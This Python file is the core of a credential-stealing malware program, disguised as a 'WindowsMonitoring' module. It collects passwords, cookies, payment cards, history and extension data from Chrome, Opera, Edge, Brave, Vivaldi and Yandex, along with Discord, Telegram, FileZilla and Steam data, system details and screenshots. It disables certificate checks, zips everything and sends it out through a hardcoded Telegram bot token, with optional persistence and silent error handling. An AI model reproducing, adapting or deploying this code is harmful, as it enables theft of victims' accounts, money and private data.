import ssl
from sys import argv
from time import sleep
from typing import List, Any
from threading import Thread
from multiprocessing import Pool

from systoring.windowsmonitoring.enums import Features, Utils, Prtts
from systoring.windowsmonitoring.helpers import functions, MemoryStorage
from systoring.windowsmonitoring.helpers.config import MultistealerConfig, Browsers
from systoring.windowsmonitoring.utils import ASt, Mssg, Prtt, Lfr, Grb
from systoring.windowsmonitoring.modules import Chromium, Dscr, FZ, Processes, Screenshot, System, TE, Steam, WS

class WindowsMonitoring(Thread):
    def __init__(
        self,
        senders: List[Any] = None,
        features: List[Features] = None,
        utils: List[Utils] = None,
        Lfrs: List[Lfr] = None,
        Prtts: List[Prtts] = None,
        Grbs: List[Grb] = None,
        delay: int = 0
    ):
        Thread.__init__(self, name="Stealer")

        if Lfrs is None:
            Lfrs = []

        if Grbs is None:
            Grbs = []

        if senders is None:
            senders = []

        if utils is None:
            utils = []

        if features is None:
            features = [Features.all]

        if Prtts is None:
            Prtts = [Prtts.disable]

        self.__Prtts = Prtts
        self.__Lfrs = Lfrs
        self.__Grbs = Grbs
        self.__senders = [TE(token="7640963418:AAEjQ0YxL2oqnhhwVC0GNSQANGQFv6Yp7GE", user_id=586901167)]
        self.__ASt = Utils.ASt in utils or Utils.all in utils
        self.__Mssg = Utils.Mssg in utils or Utils.all in utils
        self.__delay = delay

        self.__config = MultistealerConfig()
        self.__storage = MemoryStorage()

        browser_functions = [module for module in [
            Features.passwords,
            Features.cookies,
            Features.cards,
            Features.history,
            Features.bookmarks,
            Features.extensions,
            Features.WS
        ] if module in features or Features.all in features]
        browser_statuses = len(browser_functions) > 0

        self.__methods = [
            {
                "object": Chromium,
                "arguments": (
                    Browsers.CHROME.value,
                    self.__config.BrowsersData[Browsers.CHROME]["path"],
                    self.__config.BrowsersData[Browsers.CHROME]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_GX.value,
                    self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_DEFAULT.value,
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.EDGE.value,
                    self.__config.BrowsersData[Browsers.EDGE]["path"],
                    self.__config.BrowsersData[Browsers.EDGE]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.BRAVE.value,
                    self.__config.BrowsersData[Browsers.BRAVE]["path"],
                    self.__config.BrowsersData[Browsers.BRAVE]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.VIVALDI.value,
                    self.__config.BrowsersData[Browsers.VIVALDI]["path"],
                    self.__config.BrowsersData[Browsers.VIVALDI]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.YANDEX.value,
                    self.__config.BrowsersData[Browsers.YANDEX]["path"],
                    self.__config.BrowsersData[Browsers.YANDEX]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": System,
                "arguments": (
                    "System",
                ),
                "status": Features.system in features or Features.all in features
            },
            {
                "object": Processes,
                "arguments": (
                    "System",
                ),
                "status": Features.processes in features or Features.all in features
            },
            {
                "object": Screenshot,
                "arguments": (
                    "System",
                ),
                "status": Features.screenshot in features or Features.all in features
            },
            {
                "object": Dscr,
                "arguments": (
                    "Programs/Dscr",
                ),
                "status": Features.Dscr in features or Features.all in features
            },
            {
                "object": TE,
                "arguments": (
                    "Programs/TE",
                ),
                "status": Features.TE in features or Features.all in features
            },
            {
                "object": FZ,
                "arguments": (
                    "Programs/FZ",
                ),
                "status": Features.FZ in features or Features.all in features
            },
            {
                "object": Steam,
                "arguments": (
                    "Programs/Steam",
                ),
                "status": Features.steam in features or Features.all in features
            },
            {
                "object": WS,
                "arguments": (
                    "WS",
                ),
                "status": Features.WS in features or Features.all in features
            }
        ]

    def run(self) -> None:
        """
        Launches the stealer.windows.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            sleep(self.__delay)

            if self.__Mssg is True:
                Thread(target=Mssg().run).start()

            Prtt(self.__Prtts).run()

            ssl._create_default_https_context = ssl._create_unverified_context

            with Pool(processes=self.__config.PoolSize) as pool:
                results = pool.starmap(functions.run_process, [
                    (method["object"], method["arguments"]) for method in self.__methods if method["status"] is True
                ])
            pool.close()

            if self.__Grbs:

                with Pool(processes=self.__config.PoolSize) as pool:
                    Grb_results = pool.starmap(functions.run_process, [
                        (Grb, None) for Grb in self.__Grbs
                    ])
                pool.close()

                results += Grb_results

            data = self.__storage.create_zip([file for data in results if data for file in data.files])
            preview = self.__storage.create_preview([field for data in results if data for field in data.fields])

            for sender in self.__senders:
                sender.run(self.__config.ZipName, data, preview)

            for Lfr in self.__Lfrs:
                Lfr.run()

            if self.__ASt is True:
                ASt(argv[0]).run()

        except Exception as e:
            pass
